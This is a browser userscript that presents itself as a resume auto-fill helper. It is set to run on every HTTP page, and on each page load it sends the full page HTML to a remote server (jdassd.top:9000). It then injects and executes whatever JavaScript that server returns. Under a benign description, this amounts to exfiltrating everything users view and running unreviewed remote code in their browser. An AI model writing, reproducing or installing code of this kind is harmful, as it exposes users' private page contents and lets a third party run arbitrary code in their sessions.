// ==UserScript==
// @name         自动简历填写
// @namespace    http://tampermonkey.net/
// @version      2024-08-02
// @description  自动简历填写脚本，用于简历自动填写内容。
// @author       Jdassd
// @match        http://*/*
// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    // Your code here...

    // 监听页面加载事件
    window.onload = function() {
        // 页面完全加载后执行此函数
        const entireHTML = getEntireHTMLContent();
        //console.log('获取html：' + entireHTML);
        // 使用方法
        // fetchAndExecute('https://1255318900-923de4mtau-cd.scf.tencentcs.com/test/htmlGenerateJs', entireHTML);
        fetchAndExecute('http://www.jdassd.top:9000/test/htmlGenerateJs', entireHTML);
        // 如果需要进一步处理或保存整个HTML内容，可以在这里添加相关代码
    };

    // 获取整个HTML内容的函数
    function getEntireHTMLContent() {
        return document.documentElement.outerHTML;
    }

    async function sendData(url, entireHTML) {
        // 要发送的数据
        const data = {
            html: entireHTML
        };

        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            });

            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }

            const jsContent = await response.text();
            //console.log('Success:', jsContent);
            return jsContent;
        } catch (error) {
            console.error('Error:', error);
        }
    }

    async function fetchAndExecute(url, entireHTML) {
        try {
            // 等待 sendData 的响应
            const response = await sendData(url, entireHTML);
            const scriptContent = JSON.parse(response).data; // 从响应中提取 data 字段
            //console.log('scriptContent:', scriptContent); // 打印 scriptContent

            // 确保 scriptContent 是一个有效的 JavaScript 代码
            if (typeof scriptContent === 'string' && scriptContent.trim() !== '') {
                // 创建一个新的 script 标签
                const script = document.createElement('script');
                script.textContent = scriptContent;
                script.async = true;

                // 添加错误处理
                script.onerror = function() {
                    console.error(`Failed to load script from ${url}`);
                };

                // 将 script 标签添加到文档中
                document.head.appendChild(script);
            } else {
                console.error('scriptContent is not valid:', scriptContent);
            }
        } catch (error) {
            console.error('Error in fetchAndExecute:', error);
        }
    }
})();